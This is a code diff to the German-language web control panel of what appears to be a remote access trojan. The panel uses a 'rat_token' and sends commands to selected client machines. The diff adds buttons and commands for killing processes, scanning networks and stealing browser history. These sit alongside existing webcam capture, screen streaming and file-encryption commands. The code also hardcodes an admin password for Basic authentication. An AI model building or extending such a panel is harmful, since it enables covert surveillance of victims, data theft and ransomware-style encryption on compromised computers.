@@ -202,6 +202,9 @@
             <p class="text-gray-300 text-sm">Ausgewählte Clients: <span id="selected-count">0</span></p>
           </div>
           <div class="flex items-center gap-4">
+            <button id="server-stats-btn" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-lg transition duration-200">
+              <i class="fas fa-chart-bar mr-2"></i>Server Stats
+            </button>
             <button id="clear-output" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition duration-200">
               <i class="fas fa-trash mr-2"></i>Leeren
             </button>
@@ -246,11 +249,20 @@
           <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ls">
             <i class="fas fa-folder mr-1"></i>Liste Dateien
           </button>
+          <button class="quick-action bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/process_list">
+            <i class="fas fa-tasks mr-1"></i>Prozesse
+          </button>
+          <button class="quick-action bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/network_info">
+            <i class="fas fa-network-wired mr-1"></i>Netzwerk
+          </button>
           <button class="quick-action bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenstream_start">
             <i class="fas fa-desktop mr-1"></i>Screen Stream
           </button>
           <button class="quick-action bg-purple-600 hover:bg-purple-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/webcam_start">
             <i class="fas fa-video mr-1"></i>Webcam
+          </button>
+          <button class="quick-action bg-orange-600 hover:bg-orange-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/history">
+            <i class="fas fa-history mr-1"></i>Browser History
           </button>
         </div>
       </div>
@@ -327,6 +339,28 @@
     </div>
   </div>
 
+  <!-- Server Stats Modal -->
+  <div id="server-stats-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="glass-effect rounded-2xl p-6 w-full max-w-4xl mx-4 max-h-[90vh] overflow-y-auto">
+      <div class="flex items-center justify-between mb-6">
+        <h2 class="text-2xl font-bold text-white">Server Statistiken</h2>
+        <button id="close-stats-modal" class="text-gray-400 hover:text-white text-2xl">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      
+      <div id="server-stats-content" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+        <!-- Stats content will be populated by JavaScript -->
+      </div>
+      
+      <div class="mt-6 text-center">
+        <button id="refresh-stats" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition duration-200">
+          <i class="fas fa-sync-alt mr-2"></i>Aktualisieren
+        </button>
+      </div>
+    </div>
+  </div>
+
   <!-- Notifications Container -->
   <div id="notifications" class="fixed top-4 right-4 z-50 space-y-2"></div>
 
@@ -359,6 +393,10 @@
       { cmd: '/encrypt', desc: 'Verschlüsselt Dateien/Ordner' },
       { cmd: '/decrypt', desc: 'Entschlüsselt Dateien/Ordner' },
       { cmd: '/scan_cameras', desc: 'Scannt nach Netzwerk-Kameras' },
+      { cmd: '/process_list', desc: 'Zeigt laufende Prozesse' },
+      { cmd: '/kill_process', desc: 'Beendet einen Prozess (PID)' },
+      { cmd: '/network_info', desc: 'Zeigt Netzwerk-Informationen' },
+      { cmd: '/network_scan', desc: 'Scannt Netzwerk nach Hosts' },
       { cmd: '/shutdown', desc: 'Fährt das System herunter' },
       { cmd: '/restart', desc: 'Startet das System neu' }
     ];
@@ -387,6 +425,11 @@
     const webcamCanvas = document.getElementById('webcam-canvas');
     const webcamStatus = document.getElementById('webcam-status');
     const mediaPlaceholder = document.getElementById('media-placeholder');
+    const serverStatsBtn = document.getElementById('server-stats-btn');
+    const serverStatsModal = document.getElementById('server-stats-modal');
+    const closeStatsModal = document.getElementById('close-stats-modal');
+    const serverStatsContent = document.getElementById('server-stats-content');
+    const refreshStats = document.getElementById('refresh-stats');
 
     // Utility Functions
     function showNotification(message, type = 'info', duration = 3000) {
@@ -952,6 +995,12 @@
             result.key_hex = pathAndKey[1];
           }
           break;
+        case 'kill_process':
+          result.pid = args;
+          break;
+        case 'network_scan':
+          result.range = args || '192.168.1.0/24';
+          break;
         default:
           if (args) {
             result.argument = args;
@@ -959,6 +1008,62 @@
       }
       
       return result;
+    }
+
+    // Server Stats Functions
+    async function loadServerStats() {
+      try {
+        const token = localStorage.getItem('rat_token');
+        const response = await fetch('/api/stats', {
+          headers: {
+            'Authorization': `Basic ${btoa('admin:supersecretpassword123')}`
+          }
+        });
+        
+        if (response.ok) {
+          const stats = await response.json();
+          displayServerStats(stats);
+        } else {
+          throw new Error('Failed to load stats');
+        }
+      } catch (error) {
+        showNotification('Fehler beim Laden der Server-Statistiken', 'error');
+        console.error('Stats error:', error);
+      }
+    }
+
+    function displayServerStats(stats) {
+      const createStatCard = (title, value, icon, color = 'bg-gray-700') => {
+        return `
+          <div class="${color} rounded-lg p-4">
+            <div class="flex items-center justify-between">
+              <div>
+                <p class="text-gray-300 text-sm">${title}</p>
+                <p class="text-2xl font-bold text-white">${value}</p>
+              </div>
+              <i class="${icon} text-3xl text-gray-400"></i>
+            </div>
+          </div>
+        `;
+      };
+
+      const formatUptime = (seconds) => {
+        const hours = Math.floor(seconds / 3600);
+        const minutes = Math.floor((seconds % 3600) / 60);
+        return `${hours}h ${minutes}m`;
+      };
+
+      serverStatsContent.innerHTML = `
+        ${createStatCard('Verbundene Clients', stats.connected_clients || 0, 'fas fa-desktop', 'bg-blue-700')}
+        ${createStatCard('Web UI Verbindungen', stats.web_ui_connections || 0, 'fas fa-globe', 'bg-green-700')}
+        ${createStatCard('Gesperrte IPs', stats.banned_ips || 0, 'fas fa-ban', 'bg-red-700')}
+        ${createStatCard('CPU Auslastung', `${stats.cpu_percent || 0}%`, 'fas fa-microchip')}
+        ${createStatCard('RAM Auslastung', `${stats.memory_percent || 0}%`, 'fas fa-memory')}
+        ${createStatCard('Festplatte', `${stats.disk_percent || 0}%`, 'fas fa-hdd')}
+        ${createStatCard('RAM Nutzung', `${stats.memory_used_gb || 0} / ${stats.memory_total_gb || 0} GB`, 'fas fa-memory')}
+        ${createStatCard('Festplatte Nutzung', `${stats.disk_used_gb || 0} / ${stats.disk_total_gb || 0} GB`, 'fas fa-hdd')}
+        ${createStatCard('Server Uptime', formatUptime(stats.uptime || 0), 'fas fa-clock', 'bg-purple-700')}
+      `;
     }
 
     // Media Handling
@@ -1112,6 +1217,18 @@
         URL.revokeObjectURL(url);
         showNotification('Logs exportiert', 'success');
       });
+
+      // Server stats modal
+      serverStatsBtn.addEventListener('click', () => {
+        serverStatsModal.classList.remove('hidden');
+        loadServerStats();
+      });
+      
+      closeStatsModal.addEventListener('click', () => {
+        serverStatsModal.classList.add('hidden');
+      });
+      
+      refreshStats.addEventListener('click', loadServerStats);
       
       // Media controls
       document.getElementById('stop-screen-stream').addEventListener('click', () => {
